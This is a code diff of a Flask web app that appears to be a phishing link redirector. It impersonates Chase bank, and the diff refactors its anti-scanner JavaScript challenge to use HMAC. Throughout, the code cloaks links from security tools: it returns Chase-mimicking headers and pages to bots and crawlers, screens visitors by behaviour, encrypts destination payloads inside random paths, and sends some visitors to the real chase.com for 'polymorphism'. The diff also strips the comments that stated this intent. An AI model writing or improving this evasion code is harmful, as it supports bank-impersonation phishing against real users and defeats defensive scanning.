@@ -22,6 +22,7 @@ from functools import wraps
 import requests
 import bleach
 from dotenv import load_dotenv
+from cachetools import TTLCache
 
 app = Flask(__name__)
 load_dotenv()
@@ -135,6 +136,9 @@ except Exception as e:
     logger.error(f"Valkey connection failed: {str(e)}", exc_info=True)
     valkey_client = None
 
+# In-memory cache for JS challenges
+challenge_cache = TTLCache(maxsize=1000, ttl=300)
+
 # Custom Jinja2 filter for datetime
 def datetime_filter(timestamp):
     try:
@@ -182,20 +186,18 @@ def rate_limit(limit=5, per=60):
         def wrapped_function(*args, **kwargs):
             try:
                 ip = request.remote_addr
-                if not valkey_client:
-                    logger.warning("Valkey unavailable, skipping rate limit")
-                    return f(*args, **kwargs)
-                key = f"rate_limit:{ip}:{f.__name__}"
-                current = valkey_client.get(key)
-                if current is None:
-                    valkey_client.setex(key, per, 1)
-                    logger.debug(f"Rate limit set for {ip}: 1/{limit}")
-                elif int(current) >= limit:
-                    logger.warning(f"Rate limit exceeded for IP: {ip}")
-                    abort(429, "Too Many Requests")
-                else:
-                    valkey_client.incr(key)
-                    logger.debug(f"Rate limit incremented for {ip}: {int(current)+1}/{limit}")
+                if valkey_client:
+                    key = f"rate_limit:{ip}:{f.__name__}"
+                    current = valkey_client.get(key)
+                    if current is None:
+                        valkey_client.setex(key, per, 1)
+                        logger.debug(f"Rate limit set for {ip}: 1/{limit}")
+                    elif int(current) >= limit:
+                        logger.warning(f"Rate limit exceeded for IP: {ip}")
+                        abort(429, "Too Many Requests")
+                    else:
+                        valkey_client.incr(key)
+                        logger.debug(f"Rate limit incremented for {ip}: {int(current)+1}/{limit}")
                 return f(*args, **kwargs)
             except Exception as e:
                 logger.error(f"Error in rate_limit for IP {ip}: {str(e)}", exc_info=True)
@@ -284,7 +286,6 @@ def get_base_domain():
         return "tamarisksd.com"
 
 def mimic_chase_response():
-    """Mimic Chase.com server headers to fool scanners."""
     headers = {
         'Server': 'AkamaiGHost',
         'Content-Type': 'text/html; charset=UTF-8',
@@ -298,24 +299,7 @@ def mimic_chase_response():
     }
     return headers
 
-def generate_js_challenge():
-    """Generate a JavaScript challenge token and nonce."""
-    nonce = secrets.token_hex(16)
-    timestamp = int(time.time())
-    challenge_token = hashlib.sha256(f"{nonce}{timestamp}{FLASK_SECRET_KEY}".encode()).hexdigest()
-    return nonce, timestamp, challenge_token
-
-def validate_js_challenge(nonce, timestamp, token):
-    """Validate the JavaScript challenge response."""
-    try:
-        expected_token = hashlib.sha256(f"{nonce}{timestamp}{FLASK_SECRET_KEY}".encode()).hexdigest()
-        return token == expected_token and abs(int(time.time()) - timestamp) < 300  # 5-minute validity
-    except Exception as e:
-        logger.error(f"Error validating JS challenge: {str(e)}")
-        return False
-
 def check_behavior(ip):
-    """Analyze request behavior to detect bots."""
     try:
         if not valkey_client:
             return True
@@ -332,7 +316,7 @@ def check_behavior(ip):
                 'referer': headers.get('Referer', '')
             })
             if len(data['requests']) > 10:
-                data['requests'] = data['requests'][-10:]  # Keep last 10 requests
+                data['requests'] = data['requests'][-10:]
             intervals = [data['requests'][i+1]['time'] - data['requests'][i]['time'] for i in range(len(data['requests'])-1)]
             if intervals and (min(intervals) < 0.1 or len(set([r['user_agent'] for r in data['requests']])) > 2):
                 logger.warning(f"Suspicious behavior detected for IP {ip}")
@@ -509,7 +493,7 @@ def dashboard():
         username = session['username']
         logger.debug(f"Accessing dashboard for user: {username}, session: {session}")
 
-        rotate_keys()  # Rotate encryption keys if needed
+        rotate_keys()
         base_domain = get_base_domain()
         form = GenerateURLForm()
         error = None
@@ -529,10 +513,9 @@ def dashboard():
                 logger.warning(f"Invalid destination_link: {destination_link}")
 
             if not error:
-                # Generate Cisco-like long random path with variable length
                 random_path_length = random.randint(180, 220)
                 encrypted_payload = ""
-                endpoint = generate_random_string(16)  # Define endpoint here
+                endpoint = generate_random_string(16)
                 encryption_method = get_next_encryption_method()
                 expiry_timestamp = int(time.time()) + expiry
                 payload = json.dumps({
@@ -551,7 +534,6 @@ def dashboard():
                     error = f"Failed to encrypt payload: {str(e)}"
 
                 if not error:
-                    # Embed payload in random path
                     random_prefix = generate_random_string(random_path_length - len(encrypted_payload))
                     random_path = f"{random_prefix}{encrypted_payload}"
                     path_segment = f"{random_path}/{randomstring1}{randomstring2}"
@@ -773,13 +755,22 @@ def dashboard():
 def js_challenge(challenge_id):
     try:
         if request.method == "GET":
-            nonce, timestamp, challenge_token = generate_js_challenge()
+            nonce = secrets.token_hex(16)
+            timestamp = int(time.time())
+            h = hmac.HMAC(FLASK_SECRET_KEY.encode(), hashes.SHA256())
+            h.update(f"{nonce}{timestamp}".encode())
+            challenge_token = h.finalize().hex()
+            challenge_cache[challenge_id] = {
+                "nonce": nonce,
+                "timestamp": timestamp,
+                "token": challenge_token
+            }
             if valkey_client:
-                valkey_client.setex(f"challenge:{challenge_id}", 300, json.dumps({
-                    "nonce": nonce,
-                    "timestamp": timestamp,
-                    "token": challenge_token
-                }))
+                try:
+                    valkey_client.setex(f"challenge_redirect:{challenge_id}", 300, request.args.get('redirect', request.url))
+                except Exception as e:
+                    logger.warning(f"Failed to store redirect in Valkey: {str(e)}")
+            
             return render_template_string("""
                 <!DOCTYPE html>
                 <html lang="en">
@@ -790,32 +781,50 @@ def js_challenge(challenge_id):
                     <script src="https://cdn.tailwindcss.com"></script>
                     <script>
                         async function computeChallenge(nonce, timestamp) {
-                            const encoder = new TextEncoder();
-                            const data = encoder.encode(nonce + timestamp + "{{ FLASK_SECRET_KEY }}");
-                            const hash = await crypto.subtle.digest('SHA-256', data);
-                            const hashArray = Array.from(new Uint8Array(hash));
-                            const token = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
-                            return token;
-                        }
-                        async function submitChallenge() {
-                            const nonce = "{{ nonce }}";
-                            const timestamp = {{ timestamp }};
-                            const token = await computeChallenge(nonce, timestamp);
-                            const response = await fetch('/js_challenge/{{ challenge_id }}', {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({ nonce: nonce, timestamp: timestamp, token: token })
-                            });
-                            if (response.ok) {
-                                const data = await response.json();
-                                if (data.redirect) {
-                                    window.location.href = data.redirect;
-                                }
-                            } else {
-                                document.getElementById('message').textContent = 'Verification failed.';
+                            try {
+                                const encoder = new TextEncoder();
+                                const data = encoder.encode(nonce + timestamp);
+                                const hash = await crypto.subtle.digest('SHA-256', data);
+                                return Array.from(new Uint8Array(hash))
+                                    .map(b => b.toString(16).padStart(2, '0'))
+                                    .join('');
+                            } catch (e) {
+                                console.error('Challenge computation failed:', e);
+                                throw e;
                             }
                         }
-                        window.onload = submitChallenge;
+                        async function submitChallenge(retryCount = 0) {
+                            const maxRetries = 3;
+                            try {
+                                const nonce = "{{ nonce }}";
+                                const timestamp = {{ timestamp }};
+                                const token = await computeChallenge(nonce, timestamp);
+                                const response = await fetch('/js_challenge/{{ challenge_id }}', {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({ nonce, timestamp, token })
+                                });
+                                if (response.ok) {
+                                    const data = await response.json();
+                                    if (data.redirect) {
+                                        window.location.href = data.redirect;
+                                    } else {
+                                        document.getElementById('message').textContent = 'Verification successful, but no redirect provided.';
+                                    }
+                                } else {
+                                    throw new Error('Verification failed: ' + response.status);
+                                }
+                            } catch (error) {
+                                console.error('Challenge submission error:', error);
+                                if (retryCount < maxRetries) {
+                                    document.getElementById('message').textContent = 'Retrying verification...';
+                                    setTimeout(() => submitChallenge(retryCount + 1), 1000);
+                                } else {
+                                    document.getElementById('message').textContent = 'Verification failed after multiple attempts. Please refresh the page.';
+                                }
+                            }
+                        }
+                        window.onload = () => submitChallenge();
                     </script>
                 </head>
                 <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
@@ -826,31 +835,46 @@ def js_challenge(challenge_id):
                     </div>
                 </body>
                 </html>
-            """, nonce=nonce, timestamp=timestamp, challenge_id=challenge_id, FLASK_SECRET_KEY=FLASK_SECRET_KEY)
+            """, nonce=nonce, timestamp=timestamp, challenge_id=challenge_id)
+        
         elif request.method == "POST":
             data = request.get_json()
             if not data or not all(k in data for k in ['nonce', 'timestamp', 'token']):
                 logger.error("Invalid JS challenge data")
                 abort(400, "Invalid challenge data")
-            if valkey_client:
-                challenge_data = valkey_client.get(f"challenge:{challenge_id}")
-                if not challenge_data:
-                    logger.error("Challenge expired or invalid")
-                    abort(400, "Challenge expired")
-                challenge = json.loads(challenge_data)
-                if validate_js_challenge(data['nonce'], data['timestamp'], data['token']):
-                    redirect_url = valkey_client.get(f"challenge_redirect:{challenge_id}")
-                    if redirect_url:
-                        valkey_client.delete(f"challenge:{challenge_id}")
+            
+            challenge = challenge_cache.get(challenge_id)
+            if not challenge:
+                logger.error(f"Challenge {challenge_id} expired or invalid")
+                abort(400, "Challenge expired")
+            
+            h = hmac.HMAC(FLASK_SECRET_KEY.encode(), hashes.SHA256())
+            h.update(f"{data['nonce']}{int(data['timestamp'])}".encode())
+            expected_token = h.finalize().hex()
+            if data['token'] == expected_token and abs(int(time.time()) - int(data['timestamp'])) <= 300:
+                redirect_url = request.url
+                if valkey_client:
+                    try:
+                        redirect_url = valkey_client.get(f"challenge_redirect:{challenge_id}") or request.url
                         valkey_client.delete(f"challenge_redirect:{challenge_id}")
-                        return jsonify({"success": True, "redirect": redirect_url})
-                logger.warning("JS challenge failed")
-                abort(403, "Challenge verification failed")
+                    except Exception as e:
+                        logger.warning(f"Failed to retrieve/delete redirect from Valkey: {str(e)}")
+                
+                challenge_cache.pop(challenge_id, None)
+                
+                if valkey_client:
+                    try:
+                        valkey_client.setex(f"challenge_passed:{challenge_id}", 300, "1")
+                    except Exception as e:
+                        logger.warning(f"Failed to mark challenge passed in Valkey: {str(e)}")
+                
+                return jsonify({"success": True, "redirect": redirect_url})
             else:
-                logger.error("Valkey unavailable for challenge validation")
-                abort(500, "Server error")
+                logger.warning(f"JS challenge failed for challenge_id: {challenge_id}")
+                abort(403, "Challenge verification failed")
+    
     except Exception as e:
-        logger.error(f"Error in js_challenge: {str(e)}")
+        logger.error(f"Error in js_challenge: {str(e)}", exc_info=True)
         headers = mimic_chase_response()
         return Response(
             "<html><head><title>Chase Online</title></head><body>Verification failed</body></html>",
@@ -972,7 +996,6 @@ def redirect_handler(username, endpoint, path_segment):
         logger.debug(f"Redirect handler called: username={username}, base_domain={base_domain}, endpoint={endpoint}, "
                      f"path_segment={path_segment}, IP={request.remote_addr}, URL={request.url}")
 
-        # Check if IP is blocked due to bot trap
         if valkey_client and valkey_client.exists(f"blocked:{request.remote_addr}"):
             logger.warning(f"Blocked IP {request.remote_addr} accessed redirect handler")
             headers = mimic_chase_response()
@@ -982,7 +1005,6 @@ def redirect_handler(username, endpoint, path_segment):
                 headers=headers
             )
 
-        # Scanner detection
         headers = mimic_chase_response()
         if 'User-Agent' in request.headers and any(keyword in request.headers['User-Agent'].lower() for keyword in ['bot', 'crawler', 'scanner', 'spider']):
             logger.debug("Detected scanner, returning Chase.com-like response")
@@ -992,7 +1014,6 @@ def redirect_handler(username, endpoint, path_segment):
                 headers=headers
             )
 
-        # Behavioral analysis
         if not check_behavior(request.remote_addr):
             logger.warning(f"Behavioral check failed for IP {request.remote_addr}")
             return Response(
@@ -1001,14 +1022,12 @@ def redirect_handler(username, endpoint, path_segment):
                 headers=headers
             )
 
-        # JavaScript challenge
         challenge_id = hashlib.sha256(f"{request.remote_addr}{request.url}".encode()).hexdigest()
         if not valkey_client or not valkey_client.exists(f"challenge_passed:{challenge_id}"):
             if valkey_client:
                 valkey_client.setex(f"challenge_redirect:{challenge_id}", 300, request.url)
             return redirect(url_for('js_challenge', challenge_id=challenge_id))
 
-        # Split path_segment to extract random_path and randomstrings
         path_parts = path_segment.rsplit('/', 1)
         if len(path_parts) != 2:
             logger.error(f"Invalid path_segment format: {path_segment}")
@@ -1017,12 +1036,10 @@ def redirect_handler(username, endpoint, path_segment):
         randomstring1 = randomstrings[:len(randomstrings)//2]
         randomstring2 = randomstrings[len(randomstrings)//2:]
 
-        # Randomized delay
         delay = random.uniform(0.3, 0.9)
         time.sleep(delay)
         logger.debug(f"Applied random delay of {delay:.3f} seconds")
 
-        # Extract payload from random_path
         encrypted_payload = random_path[-64:]
         url_id = hashlib.sha256(f"{endpoint}{encrypted_payload}".encode()).hexdigest()
 
@@ -1101,8 +1118,7 @@ def redirect_handler(username, endpoint, path_segment):
             logger.error(f"Payload parsing error: {str(e)}", exc_info=True)
             abort(400, "Invalid payload")
 
-        # Fake redirect for polymorphism
-        if random.random() < 0.2:  # 20% chance
+        if random.random() < 0.2:
             logger.debug("Performing fake redirect to chase.com")
             return redirect("https://www.chase.com", code=302, Response=Response(headers=headers))
 
